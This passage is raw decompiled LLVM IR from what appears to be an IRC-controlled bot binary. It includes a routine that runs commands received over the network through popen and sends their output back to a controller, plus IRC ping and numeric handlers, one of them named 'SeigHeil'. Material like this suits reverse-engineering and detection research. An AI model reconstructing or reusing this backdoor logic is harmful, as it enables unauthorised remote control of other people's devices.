  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1af1c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1af1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1af20

dec_label_pc_1af20:                               ; preds = %dec_label_pc_1ae10, %dec_label_pc_1af10
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_3aa64.1101 to i32), i32* @r1, align 4
  %v5_1af2c = call i32 @__GI_strncmp(i8* %v5_1a534, i32 ptrtoint ([6 x i8]* @global_var_3aa64.1101 to i32), i32 5)
  store i32 %v5_1af2c, i32* %r0.global-to-local, align 4
  %v2_1af34 = icmp eq i32 %v5_1af2c, 0
  br i1 %v2_1af34, label %dec_label_pc_1af3c, label %dec_label_pc_1b030

dec_label_pc_1af3c:                               ; preds = %dec_label_pc_1af20
  store i32 %tmp61, i32* %r0.global-to-local, align 4
  %v2_1af40 = call i32 @mfork(i32 %tmp61)
  store i32 %v2_1af40, i32* %r0.global-to-local, align 4
  %v2_1af48 = icmp eq i32 %v2_1af40, 0
  br i1 %v2_1af48, label %dec_label_pc_1af50, label %dec_label_pc_1b404

dec_label_pc_1af50:                               ; preds = %dec_label_pc_1af3c
  %v2_1af58 = ptrtoint i32* %stack_var_-2180 to i32
  store i32 %v2_1af58, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1af68 = call i32 @__GI_memset()
  %v1_1af70 = add i32 %v2_1a530, 5
  store i32 %v2_1af58, i32* @r0, align 4
  %v4_1af88 = call i32 @sprintf(i32 %v2_1af58, i32 ptrtoint ([98 x i8]* @global_var_3aa6c.1103 to i32), i32 %v1_1af70)
  store i32 %v2_1af58, i32* %r0.global-to-local, align 4
  %v3_1afa0 = call i32 @popen(i32 %v2_1af58, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0))
  store i32 %v3_1afa0, i32* %r0.global-to-local, align 4
  %v1_1b010 = inttoptr i32 %v3_1afa0 to i16*
  %v2_1b01023 = call i32 @feof(i16* %v1_1b010)
  store i32 %v2_1b01023, i32* %r0.global-to-local, align 4
  %v2_1b01825 = icmp eq i32 %v2_1b01023, 0
  br i1 %v2_1b01825, label %dec_label_pc_1afb0, label %dec_label_pc_1b020

dec_label_pc_1afb0:                               ; preds = %dec_label_pc_1af50, %dec_label_pc_1afb0
  store i32 %v2_1af58, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1024, i32* @r2, align 4
  %v0_1afc8 = call i32 @__GI_memset()
  store i32 %v2_1af58, i32* %r0.global-to-local, align 4
  %v3_1afe4 = call i32 @fgets(i32 %v2_1af58, i32 1024, i32 %v3_1afa0)
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 %tmp61, i32* @r2, align 4
  %v3_1b000 = call i32 @Send(i32 %arg1, i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32))
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1b008 = call i32 @sleep(i32 1)
  store i32 %v3_1afa0, i32* %r0.global-to-local, align 4
  %v2_1b010 = call i32 @feof(i16* %v1_1b010)
  store i32 %v2_1b010, i32* %r0.global-to-local, align 4
  %v2_1b018 = icmp eq i32 %v2_1b010, 0
  br i1 %v2_1b018, label %dec_label_pc_1afb0, label %dec_label_pc_1b020

dec_label_pc_1b020:                               ; preds = %dec_label_pc_1afb0, %dec_label_pc_1af50
  store i32 %v3_1afa0, i32* %r0.global-to-local, align 4
  %v1_1b024 = call i32 @pclose(i32 %v3_1afa0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1b02c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1b02c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b030

dec_label_pc_1b030:                               ; preds = %dec_label_pc_1af20, %dec_label_pc_1b020
  store i32 %v2_1a530, i32* %r0.global-to-local, align 4
  %v3_1b034 = call i32 @strlen(i8* %v5_1a534)
  store i32 %v3_1b034, i32* %r0.global-to-local, align 4
  %v2_1b080 = ptrtoint i32* %stack_var_-24 to i32
  %v2_1b084 = add i32 %v2_1b080, -1132
  br label %dec_label_pc_1b0ac

dec_label_pc_1b04c:                               ; preds = %dec_label_pc_1b0ac
  %v2_1b050 = load i8, i8* %stack_var_-76.0, align 1
  %v7_1b054 = icmp eq i8 %v2_1b050, 32
  br i1 %v7_1b054, label %dec_label_pc_1b17c, label %dec_label_pc_1b05c

dec_label_pc_1b05c:                               ; preds = %dec_label_pc_1b04c
  %v2_1b060 = load i8, i8* %stack_var_-76.0, align 1
  %v2_1b064 = icmp eq i8 %v2_1b060, 0
  br i1 %v2_1b064, label %dec_label_pc_1b17c, label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b05c
  %v2_1b074 = load i8, i8* %stack_var_-76.0, align 1
  store i32 %v2_1b080, i32* %r0.global-to-local, align 4
  %v2_1b088 = add i32 %v2_1b084, %storemerge13
  %v3_1b090 = inttoptr i32 %v2_1b088 to i8*
  store i8 %v2_1b074, i8* %v3_1b090, align 1
  %v1_1b098 = add i32 %v4_1b04c, 1
  %v5_1b09c = inttoptr i32 %v1_1b098 to i8*
  %v1_1b0a4 = add nuw i32 %storemerge13, 1
  br label %dec_label_pc_1b0ac

dec_label_pc_1b0ac:                               ; preds = %dec_label_pc_1b030, %dec_label_pc_1b06c
  %stack_var_-76.0 = phi i8* [ %v5_1a534, %dec_label_pc_1b030 ], [ %v5_1b09c, %dec_label_pc_1b06c ]
  %storemerge13 = phi i32 [ 0, %dec_label_pc_1b030 ], [ %v1_1b0a4, %dec_label_pc_1b06c ]
  %v5_1b0b8 = icmp slt i32 %storemerge13, %v3_1b034
  %v4_1b04c = ptrtoint i8* %stack_var_-76.0 to i32
  br i1 %v5_1b0b8, label %dec_label_pc_1b04c, label %dec_label_pc_1b17c

dec_label_pc_1b148:                               ; preds = %dec_label_pc_1b17c
  %v2_1b154 = add i32 %storemerge14, %v4_1b04c
  %v1_1b158 = inttoptr i32 %v2_1b154 to i8*
  %v2_1b158 = load i8, i8* %v1_1b158, align 1
  %v7_1b15c = icmp eq i8 %v2_1b158, 32
  br i1 %v7_1b15c, label %dec_label_pc_1b164, label %dec_label_pc_1b170

dec_label_pc_1b164:                               ; preds = %dec_label_pc_1b148
  %v1_1b168 = add i32 %stack_var_-72.1, 1
  br label %dec_label_pc_1b170

dec_label_pc_1b170:                               ; preds = %dec_label_pc_1b148, %dec_label_pc_1b164
  %stack_var_-72.0 = phi i32 [ %v1_1b168, %dec_label_pc_1b164 ], [ %stack_var_-72.1, %dec_label_pc_1b148 ]
  %v1_1b174 = add i32 %storemerge14, 1
  br label %dec_label_pc_1b17c

dec_label_pc_1b17c:                               ; preds = %dec_label_pc_1b04c, %dec_label_pc_1b05c, %dec_label_pc_1b0ac, %dec_label_pc_1b170
  %stack_var_-72.1 = phi i32 [ %stack_var_-72.0, %dec_label_pc_1b170 ], [ 0, %dec_label_pc_1b0ac ], [ 0, %dec_label_pc_1b05c ], [ 0, %dec_label_pc_1b04c ]
  %storemerge14 = phi i32 [ %v1_1b174, %dec_label_pc_1b170 ], [ 0, %dec_label_pc_1b0ac ], [ 0, %dec_label_pc_1b05c ], [ 0, %dec_label_pc_1b04c ]
  store i32 %storemerge14, i32* @r4, align 4
  store i32 %v4_1b04c, i32* %r0.global-to-local, align 4
  %v3_1b184 = call i32 @strlen(i8* %stack_var_-76.0)
  store i32 %v3_1b184, i32* %r0.global-to-local, align 4
  %v0_1b18c = load i32, i32* @r4, align 4
  %v3_1b18c = icmp ult i32 %v0_1b18c, %v3_1b184
  br i1 %v3_1b18c, label %dec_label_pc_1b148, label %dec_label_pc_1b194

dec_label_pc_1b194:                               ; preds = %dec_label_pc_1b17c
  %v1_1b198 = add i32 %stack_var_-72.1, 1
  %v7_1b1a8 = icmp slt i32 %v1_1b198, 11
  br i1 %v7_1b1a8, label %dec_label_pc_1b1b4, label %dec_label_pc_1b1ac

dec_label_pc_1b1ac:                               ; preds = %dec_label_pc_1b194
  br label %dec_label_pc_1b1b4

dec_label_pc_1b1b4:                               ; preds = %dec_label_pc_1b194, %dec_label_pc_1b1ac
  %stack_var_-72.2 = phi i32 [ %v1_1b198, %dec_label_pc_1b194 ], [ 10, %dec_label_pc_1b1ac ]
  %tmp119 = mul i32 %stack_var_-72.2, 4
  %v3_1b1d0 = add i32 %tmp119, 4
  %v2_1b1d8 = add i32 %v2_1b080, -108
  %v2_1b1dc = add i32 %v2_1b1d8, %v3_1b1d0
  %v2_1b1e4 = inttoptr i32 %v2_1b1dc to i32*
  store i32 ptrtoint (i32* @global_var_367b4.260 to i32), i32* %v2_1b1e4, align 4
  %v2_1b30c18 = load i8, i8* %stack_var_-76.0, align 1
  %v2_1b31020 = icmp eq i8 %v2_1b30c18, 0
  br i1 %v2_1b31020, label %dec_label_pc_1b318, label %dec_label_pc_1b1f4

dec_label_pc_1b1f4:                               ; preds = %dec_label_pc_1b1b4, %dec_label_pc_1b25c
  %v4_1b30822 = phi i32 [ %v2_1b300.pre-phi, %dec_label_pc_1b25c ], [ %v4_1b04c, %dec_label_pc_1b1b4 ]
  %stack_var_-68.021 = phi i32 [ %v1_1b2ec, %dec_label_pc_1b25c ], [ 1, %dec_label_pc_1b1b4 ]
  %v1_1b1f8 = add i32 %v4_1b30822, 1
  %v5_1b1fc = inttoptr i32 %v1_1b1f8 to i8*
  %v6_1b20c = icmp slt i32 %stack_var_-68.021, %stack_var_-72.2
  br i1 %v6_1b20c, label %dec_label_pc_1b228, label %dec_label_pc_1b318

dec_label_pc_1b21c:                               ; preds = %dec_label_pc_1b240
  %v1_1b220 = add i32 %storemerge16, 1
  br label %dec_label_pc_1b228

dec_label_pc_1b228:                               ; preds = %dec_label_pc_1b1f4, %dec_label_pc_1b21c
  %storemerge16 = phi i32 [ %v1_1b220, %dec_label_pc_1b21c ], [ 0, %dec_label_pc_1b1f4 ]
  store i32 %v1_1b1f8, i32* %r0.global-to-local, align 4
  %v3_1b230 = call i32 @strlen(i8* %v5_1b1fc)
  store i32 %v3_1b230, i32* %r0.global-to-local, align 4
  %v3_1b238 = icmp ult i32 %storemerge16, %v3_1b230
  br i1 %v3_1b238, label %dec_label_pc_1b240, label %dec_label_pc_1b228.dec_label_pc_1b25c_crit_edge

dec_label_pc_1b228.dec_label_pc_1b25c_crit_edge:  ; preds = %dec_label_pc_1b228
  %.pre59 = add i32 %storemerge16, %v1_1b1f8
  %.pre60 = inttoptr i32 %.pre59 to i8*
  br label %dec_label_pc_1b25c

dec_label_pc_1b240:                               ; preds = %dec_label_pc_1b228
  %v2_1b24c = add i32 %storemerge16, %v1_1b1f8
  %v1_1b250 = inttoptr i32 %v2_1b24c to i8*
  %v2_1b250 = load i8, i8* %v1_1b250, align 1
  %v7_1b254 = icmp eq i8 %v2_1b250, 32
  br i1 %v7_1b254, label %dec_label_pc_1b25c, label %dec_label_pc_1b21c

dec_label_pc_1b25c:                               ; preds = %dec_label_pc_1b240, %dec_label_pc_1b228.dec_label_pc_1b25c_crit_edge
  %v5_1b304.pre-phi = phi i8* [ %.pre60, %dec_label_pc_1b228.dec_label_pc_1b25c_crit_edge ], [ %v1_1b250, %dec_label_pc_1b240 ]
  %v2_1b300.pre-phi = phi i32 [ %.pre59, %dec_label_pc_1b228.dec_label_pc_1b25c_crit_edge ], [ %v2_1b24c, %dec_label_pc_1b240 ]
  store i32 %stack_var_-68.021, i32* @r4, align 4
  %v1_1b264 = add i32 %storemerge16, 1
  store i32 %v1_1b264, i32* %r0.global-to-local, align 4
  %v1_1b26c = call i32 @malloc(i32 %v1_1b264)
  %v0_1b27c = load i32, i32* @r4, align 4
  %v3_1b27c = mul i32 %v0_1b27c, 4
  store i32 %v2_1b080, i32* %r0.global-to-local, align 4
  %v2_1b288 = add i32 %v2_1b1d8, %v3_1b27c
  %v2_1b28c = inttoptr i32 %v2_1b288 to i32*
  store i32 %v1_1b26c, i32* %v2_1b28c, align 4
  %v3_1b298 = mul i32 %stack_var_-68.021, 4
  %v2_1b2a4 = add i32 %v2_1b1d8, %v3_1b298
  %v1_1b2a8 = inttoptr i32 %v2_1b2a4 to i32*
  %v2_1b2a8 = load i32, i32* %v1_1b2a8, align 4
  store i32 %v2_1b2a8, i32* %r0.global-to-local, align 4
  store i32 %v1_1b1f8, i32* @r1, align 4
  %v2_1b2b8 = call i32 @strncpy(i32 %v2_1b2a8, i32 %v1_1b1f8)
  store i32 %v2_1b080, i32* %r0.global-to-local, align 4
  %v2_1b2d4 = load i32, i32* %v1_1b2a8, align 4
  %v2_1b2dc = add i32 %v2_1b2d4, %storemerge16
  %v3_1b2e4 = inttoptr i32 %v2_1b2dc to i8*
  store i8 0, i8* %v3_1b2e4, align 1
  %v1_1b2ec = add nuw i32 %stack_var_-68.021, 1
  %v2_1b30c = load i8, i8* %v5_1b304.pre-phi, align 1
  %v2_1b310 = icmp eq i8 %v2_1b30c, 0
  br i1 %v2_1b310, label %dec_label_pc_1b318, label %dec_label_pc_1b1f4

dec_label_pc_1b318:                               ; preds = %dec_label_pc_1b25c, %dec_label_pc_1b1f4, %dec_label_pc_1b1b4
  %v7_1b3f8 = load i32, i32* bitcast ([4 x i8]** @global_var_45364.1107 to i32*), align 4
  %v2_1b3fc = icmp eq i32 %v7_1b3f8, 0
  br i1 %v2_1b3fc, label %dec_label_pc_1b404, label %dec_label_pc_1b324

dec_label_pc_1b324:                               ; preds = %dec_label_pc_1b318
  store i32 %v7_1b3f8, i32* %r0.global-to-local, align 4
  %v2_1b344 = inttoptr i32 %v7_1b3f8 to i8*
  %v3_1b344 = call i32 @__GI_strcasecmp(i8* %v2_1b344, i32 %v2_1a478)
  store i32 %v3_1b344, i32* %r0.global-to-local, align 4
  %v2_1b36c = load i32, i32* inttoptr (i32 add (i32 ptrtoint ([4 x i8]** @global_var_45364.1107 to i32), i32 4) to i32*), align 4
  store i32 %v2_1b36c, i32* @r4, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  store i32 111508, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_1b36c)
  %v5_1b3dc110 = icmp sgt i32 %stack_var_-72.2, 1
  br i1 %v5_1b3dc110, label %dec_label_pc_1b3a0, label %dec_label_pc_1b404

dec_label_pc_1b3a0:                               ; preds = %dec_label_pc_1b324, %dec_label_pc_1b3a0
  %storemerge15111 = phi i32 [ %v1_1b3c8, %dec_label_pc_1b3a0 ], [ 1, %dec_label_pc_1b324 ]
  %v3_1b3a8 = mul i32 %storemerge15111, 4
  %v2_1b3b4 = add i32 %v2_1b1d8, %v3_1b3a8
  %v1_1b3b8 = inttoptr i32 %v2_1b3b4 to i32*
  %v2_1b3b8 = load i32, i32* %v1_1b3b8, align 4
  store i32 %v2_1b3b8, i32* @r0, align 4
  %v0_1b3c0 = call i32 @free()
  store i32 %v0_1b3c0, i32* %r0.global-to-local, align 4
  %v1_1b3c8 = add nuw nsw i32 %storemerge15111, 1
  %v5_1b3dc = icmp slt i32 %v1_1b3c8, %stack_var_-72.2
  br i1 %v5_1b3dc, label %dec_label_pc_1b3a0, label %dec_label_pc_1b404

dec_label_pc_1b404:                               ; preds = %dec_label_pc_1b324, %dec_label_pc_1b3a0, %dec_label_pc_1b318, %dec_label_pc_1af3c, %dec_label_pc_1ae2c, %dec_label_pc_1ad1c, %dec_label_pc_1ac0c, %dec_label_pc_1aafc, %dec_label_pc_1a9ec, %dec_label_pc_1a8dc, %dec_label_pc_1a7cc, %dec_label_pc_1a6bc, %dec_label_pc_1a5ac, %dec_label_pc_1a4ec, %dec_label_pc_1a450, %dec_label_pc_1a428, %entry
  %v1_1b40c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1b40c

; uselistorder directives
  uselistorder i32 %v1_1b3c8, { 1, 0 }
  uselistorder i32 %v7_1b3f8, { 1, 0, 2 }
  uselistorder i32 %.pre59, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v1_1b1f8, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-68.021, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-72.2, { 3, 1, 2, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %stack_var_-72.1, { 0, 2, 1 }
  uselistorder i32 %v4_1b04c, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge13, { 2, 0, 1 }
  uselistorder i8* %stack_var_-76.0, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v2_1b080, { 2, 1, 0, 4, 3 }
  uselistorder i16* %v1_1b010, { 1, 0 }
  uselistorder i32 %v3_1afa0, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1af58, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1af00, { 1, 0 }
  uselistorder i32 %v3_1ae90, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1ae48, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1adf0, { 1, 0 }
  uselistorder i32 %v3_1ad80, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1ad38, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1ace0, { 1, 0 }
  uselistorder i32 %v3_1ac70, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1ac28, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1abd0, { 1, 0 }
  uselistorder i32 %v3_1ab60, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1ab18, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1aac0, { 1, 0 }
  uselistorder i32 %v3_1aa50, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1aa08, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1a9b0, { 1, 0 }
  uselistorder i32 %v3_1a940, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1a8f8, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1a8a0, { 1, 0 }
  uselistorder i32 %v3_1a830, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1a7e8, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1a790, { 1, 0 }
  uselistorder i32 %v3_1a720, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1a6d8, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i16* %v1_1a680, { 1, 0 }
  uselistorder i32 %v3_1a610, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v2_1a5c8, { 1, 0, 2, 4, 3, 6, 5, 7 }
  uselistorder i32 %v2_1a530, { 11, 10, 12, 9, 13, 8, 14, 7, 15, 6, 16, 5, 17, 4, 18, 3, 19, 2, 20, 1, 21, 0, 22, 23 }
  uselistorder i32 %storemerge12, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v1_1a498, { 2, 0, 1, 3, 4 }
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge10, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp61, { 2, 4, 3, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 19, 18, 20, 22, 21, 23, 25, 24, 26, 28, 27, 29, 31, 30, 32, 0, 1, 33, 35, 34 }
  uselistorder i32* %r0.global-to-local, { 184, 22, 21, 25, 23, 24, 26, 27, 28, 30, 29, 33, 31, 32, 35, 34, 36, 38, 37, 43, 42, 39, 40, 41, 2, 1, 44, 46, 45, 48, 47, 49, 51, 50, 56, 55, 52, 53, 54, 4, 3, 57, 59, 58, 61, 60, 62, 64, 63, 69, 68, 65, 66, 67, 6, 5, 70, 72, 71, 74, 73, 75, 77, 76, 82, 81, 78, 79, 80, 8, 7, 83, 85, 84, 87, 86, 88, 90, 89, 95, 94, 91, 92, 93, 10, 9, 96, 98, 97, 100, 99, 101, 103, 102, 108, 107, 104, 105, 106, 12, 11, 109, 111, 110, 113, 112, 114, 116, 115, 121, 120, 117, 118, 119, 14, 13, 122, 124, 123, 126, 125, 127, 129, 128, 134, 133, 130, 131, 132, 16, 15, 135, 137, 136, 139, 138, 140, 142, 141, 147, 146, 143, 144, 145, 18, 17, 148, 150, 149, 152, 151, 153, 155, 154, 160, 159, 156, 157, 158, 20, 19, 161, 163, 162, 165, 164, 167, 166, 169, 168, 171, 170, 173, 172, 175, 174, 176, 178, 177, 180, 179, 182, 181, 185, 183, 0 }
  uselistorder i32 (i32)* @pclose, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_39fcc.1067 to i32), { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_37118.168, i32 0, i32 0), { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 2, 1, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i8* bitcast (i8** @global_var_49b3c.37 to i8*), { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32 %arg3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %arg1, { 2, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17, 20, 19, 22, 21, 24, 23, 1, 0, 25 }
  uselistorder label %dec_label_pc_1b404, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder label %dec_label_pc_1b3a0, { 1, 0 }
  uselistorder label %dec_label_pc_1b228, { 1, 0 }
  uselistorder label %dec_label_pc_1b1f4, { 1, 0 }
  uselistorder label %dec_label_pc_1b1b4, { 1, 0 }
  uselistorder label %dec_label_pc_1b17c, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1b170, { 1, 0 }
  uselistorder label %dec_label_pc_1b0ac, { 1, 0 }
  uselistorder label %dec_label_pc_1b030, { 1, 0 }
  uselistorder label %dec_label_pc_1afb0, { 1, 0 }
  uselistorder label %dec_label_pc_1af20, { 1, 0 }
  uselistorder label %dec_label_pc_1aea0, { 1, 0 }
  uselistorder label %dec_label_pc_1ae10, { 1, 0 }
  uselistorder label %dec_label_pc_1ad90, { 1, 0 }
  uselistorder label %dec_label_pc_1ad00, { 1, 0 }
  uselistorder label %dec_label_pc_1ac80, { 1, 0 }
  uselistorder label %dec_label_pc_1abf0, { 1, 0 }
  uselistorder label %dec_label_pc_1ab70, { 1, 0 }
  uselistorder label %dec_label_pc_1aae0, { 1, 0 }
  uselistorder label %dec_label_pc_1aa60, { 1, 0 }
  uselistorder label %dec_label_pc_1a9d0, { 1, 0 }
  uselistorder label %dec_label_pc_1a950, { 1, 0 }
  uselistorder label %dec_label_pc_1a8c0, { 1, 0 }
  uselistorder label %dec_label_pc_1a840, { 1, 0 }
  uselistorder label %dec_label_pc_1a7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1a730, { 1, 0 }
  uselistorder label %dec_label_pc_1a6a0, { 1, 0 }
  uselistorder label %dec_label_pc_1a620, { 1, 0 }
  uselistorder label %dec_label_pc_1a590, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1a4b8, { 1, 0 }
  uselistorder label %dec_label_pc_1a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_1a370, { 1, 0 }
}

define i32 @_376(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 111644, i32* %stack_var_-4, align 4
  %v2_1b418 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b418, i32* @fp, align 4
  %v2_1b430 = load i32, i32* @global_var_52594.89, align 4
  store i32 %v2_1b430, i32* @r2, align 4
  %v3_1b440 = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_3aad0.1110 to i32))
  %v2_1b448 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_1b448, i32* @r2, align 4
  %v3_1b45c = call i32 @Send(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_3aae0.1115 to i32))
  %v2_1b464 = load i32, i32* @global_var_52594.89, align 4
  store i32 %v2_1b464, i32* @r2, align 4
  %v3_1b474 = call i32 @Send(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_3aaf0.1117 to i32))
  %v2_1b47c = load i32, i32* @global_var_49b34.817, align 4
  %v2_1b480 = icmp eq i32 %v2_1b47c, 0
  br i1 %v2_1b480, label %dec_label_pc_1b488, label %dec_label_pc_1b490

dec_label_pc_1b488:                               ; preds = %entry
  %v1_1b48c = call i32 @SeigHeil(i32 %arg1)
  br label %dec_label_pc_1b490

dec_label_pc_1b490:                               ; preds = %entry, %dec_label_pc_1b488
  %v1_1b498 = phi i32 [ %v3_1b474, %entry ], [ %v1_1b48c, %dec_label_pc_1b488 ]
  ret i32 %v1_1b498

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @SeigHeil, { 1, 0 }
  uselistorder label %dec_label_pc_1b490, { 1, 0 }
}

define i32 @_PING(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 111812, i32* %stack_var_-4, align 4
  %v2_1b4c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b4c0, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_1b4e0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_3aaf8.1120 to i32))
  ret i32 %v3_1b4e0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_352(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 111872, i32* %stack_var_-4, align 4
  %v2_1b4fc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b4fc, i32* @fp, align 4
  br label %dec_label_pc_1b544.preheader

dec_label_pc_1b52c:                               ; preds = %dec_label_pc_1b55c
  %v1_1b530 = add i32 %.pre, 1
  %v5_1b534 = inttoptr i32 %v1_1b530 to i8*
  %v1_1b53c = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_1b544

dec_label_pc_1b544:                               ; preds = %dec_label_pc_1b544.preheader, %dec_label_pc_1b52c
  %stack_var_-32.0 = phi i8* [ %v5_1b534, %dec_label_pc_1b52c ], [ %stack_var_-32.119, %dec_label_pc_1b544.preheader ]
  %stack_var_-40.0 = phi i32 [ %v1_1b53c, %dec_label_pc_1b52c ], [ %stack_var_-40.120, %dec_label_pc_1b544.preheader ]
  %v3_1b54c = call i32 @strlen(i8* %arg3)
  %v3_1b554 = icmp ult i32 %stack_var_-40.0, %v3_1b54c
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_1b554, label %dec_label_pc_1b55c, label %dec_label_pc_1b56c

dec_label_pc_1b55c:                               ; preds = %dec_label_pc_1b544
  %v2_1b560 = load i8, i8* %stack_var_-32.0, align 1
  %v7_1b564 = icmp eq i8 %v2_1b560, 32
  br i1 %v7_1b564, label %dec_label_pc_1b56c, label %dec_label_pc_1b52c

dec_label_pc_1b56c:                               ; preds = %dec_label_pc_1b544, %dec_label_pc_1b55c
  %v1_1b570 = add i32 %.pre, 1
  %v3_1b580 = call i32 @strlen(i8* %arg3)
  %v9_1b588 = icmp eq i32 %stack_var_-40.0, %v3_1b580
  br i1 %v9_1b588, label %dec_label_pc_1b80c, label %dec_label_pc_1b590

dec_label_pc_1b590:                               ; preds = %dec_label_pc_1b56c
  %v5_1b574 = inttoptr i32 %v1_1b570 to i8*
  %v1_1b594 = add nuw nsw i32 %storemerge921, 1
  %v7_1b5a4 = icmp slt i32 %v1_1b594, 5
  br i1 %v7_1b5a4, label %dec_label_pc_1b544.preheader, label %dec_label_pc_1b5c0

dec_label_pc_1b544.preheader:                     ; preds = %entry, %dec_label_pc_1b590
  %storemerge921 = phi i32 [ 0, %entry ], [ %v1_1b594, %dec_label_pc_1b590 ]
  %stack_var_-40.120 = phi i32 [ 0, %entry ], [ %stack_var_-40.0, %dec_label_pc_1b590 ]
  %stack_var_-32.119 = phi i8* [ %arg3, %entry ], [ %v5_1b574, %dec_label_pc_1b590 ]
  br label %dec_label_pc_1b544

dec_label_pc_1b5b4:                               ; preds = %dec_label_pc_1b5d8
  %v1_1b5b8 = add i32 %storemerge10, 1
  br label %dec_label_pc_1b5c0

dec_label_pc_1b5c0:                               ; preds = %dec_label_pc_1b590, %dec_label_pc_1b5b4
  %storemerge10 = phi i32 [ %v1_1b5b8, %dec_label_pc_1b5b4 ], [ 0, %dec_label_pc_1b590 ]
  store i32 %storemerge10, i32* @r4, align 4
  %v3_1b5c8 = call i32 @strlen(i8* %v5_1b574)
  %v0_1b5d0 = load i32, i32* @r4, align 4
  %v3_1b5d0 = icmp ult i32 %v0_1b5d0, %v3_1b5c8
  br i1 %v3_1b5d0, label %dec_label_pc_1b5d8, label %dec_label_pc_1b5c0.dec_label_pc_1b5f4_crit_edge

